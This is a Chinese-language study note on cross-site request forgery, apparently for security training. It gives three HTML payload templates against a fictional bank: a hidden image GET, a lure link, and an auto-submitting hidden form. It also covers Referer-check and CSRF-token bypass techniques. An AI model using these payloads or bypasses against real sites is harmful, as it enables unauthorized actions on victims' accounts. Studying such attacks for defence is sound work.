

Cross-Site Request Forgery 跨站请求伪造
![](图片/Pasted%20image%2020241118092155.png)
- 修改账户信息 
- 利用管理员账号，上传木马文件 
- 传播蠕虫病毒（点击、扩散、点击……） 
- 和其他攻击手段配合，实现攻击，比如XSS、SQL注入
与xss（跨站脚本攻击）的区别
![](图片/Pasted%20image%2020241118092313.png)



payload （根据bank porn练习）
1. 通过图片的img src属性，自动加载，发起GET请求
```html
<img src="http://superbank.com/bank/transfer.php?nameid=20
 02&amount=1000" width="0" height="0">
```

2. 构建一个超链接，用户点击以后，发起GET请求
```html
    <a herf="http://superbank.com/transfer.php?amount=1000&
 to=jiangang" target="_bank">小姐姐在线视频聊天<a/>
```

3. 构建一个隐藏表单，用户访问，自动提交，发起POST请求

```html
<form action="http://superbank.com/withdraw" method=POST>
 <input type="hidden" name="account" value="xiaoming" />
 <input type="hidden" name="amount" value="1000" />
 <input type="hidden" name="to" value="jiangang" />
 </form>
 <script> document.forms[0].submit(); </script>
 ```

![](图片/Pasted%20image%2020241118094136.png)
csrf属于业务逻辑漏洞，攻击者没有盗用用户的信息和诱导用户进行操作，只要用户访问了攻击页面，攻击者就会伪造成用户向服务器发出请求。
特别注意<3>用户在没有登出A网站的情况下，访问攻击页面




防御
同源策略
Referer
![](图片/Pasted%20image%2020241118095920.png)
通过www.baidu.com访问
绕过方法：
- 注册该域名的子域名
- 通过burpsuite修改referer
- 可以直接删除referer（bp，`<meta name="referrer" content="never">`)请求头没有，服务器不会验证

cookie token
[使用Burp Suite 两种方式绕过 CSRF_TOKEN_bursuit +csrf token-CSDN博客](https://blog.csdn.net/slslslyxz/article/details/111302778)
部分绕过方法
（1）token没有和用户的session绑定  
如果服务器是直接弄了个token池，如果用户提交的请求中的token能和token池中的任意一个token对应上，就能认证通过的话，那么我们可以先去该网站登录，获取一个该网站的token值，然后在CSRF攻击请求上将这个token值添加上去，这样也可以绕过验证
（2）CSRF token没有绑定到指定用户的session上  
如果服务器没有将token值与用户的session绑定，并且能够让攻击者在受害者机器上设置cookie的功能，那么我们也可以通过，登录自己的账户获得cookie和对应的token值，然后将自己的cookie和token设置到受害者的电脑上，这样就可以绕过token的验证了




工具
[CSRF自动化测试-CSRFTester-腾讯云开发者社区-腾讯云](https://cloud.tencent.com/developer/article/2148792)
[CSRF跨站请求伪造漏洞 && CSRFTester使用教程 - bcxc9405 - 博客园](https://www.cnblogs.com/bcxc/articles/17109586.html)



[CSRFTexter].(<file:///D:\CTF_something\CSRFTester-1.0\run.bat>)

